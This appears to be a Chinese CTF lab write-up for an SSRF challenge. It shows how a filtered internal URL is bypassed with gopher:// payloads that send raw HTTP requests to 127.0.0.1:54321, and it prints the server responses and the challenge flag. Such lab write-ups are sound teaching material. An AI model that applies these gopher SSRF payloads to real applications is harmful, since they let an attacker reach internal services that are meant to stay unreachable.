# [熊出没](https://ctf.xidian.edu.cn/games/37/challenges?challenge=1365)
##### 分值：100pts

## 题目描述：
### 原文：
在遥远的狗粉岭中，生活着两只可爱的熊，他们在找蜂蜜的路上发现了许多蜜罐，但是有些蜜罐似乎是猎人为了捕获他们而设置的陷阱，他们能顺利吃到蜂蜜吗?(蜂蜜在54321端口)

## 分析：
### SSRF

## 解题步骤：
根据题目，填入`http://127.0.0.1:54321`，返回陷阱罐，可能被过滤了；
填入无效值：`l`,返回`❌ URL不合法！请输入完整的 URL 地址（需包含协议和主机，例如 gopher://host:port/...）。`！，出现明示：gopher协议
构造gopher url：`gopher://127.0.0.1:54321/_GET%20/%20HTTP/1.1%0AHost:%20127.0.0.1%0A%0A`，返回
```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 33

Honey Vault
paths: /secret-honey
```
使用`gopher://127.0.0.1:54321/_GET%20/secret-honey%20HTTP/1.1%0AHost:%20127.0.0.1%0A%0A`，返回：
```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 45

moectf{1caf7434-06f1-c6d2-ee34-1f2b8b4b6268}
```
出现flag。
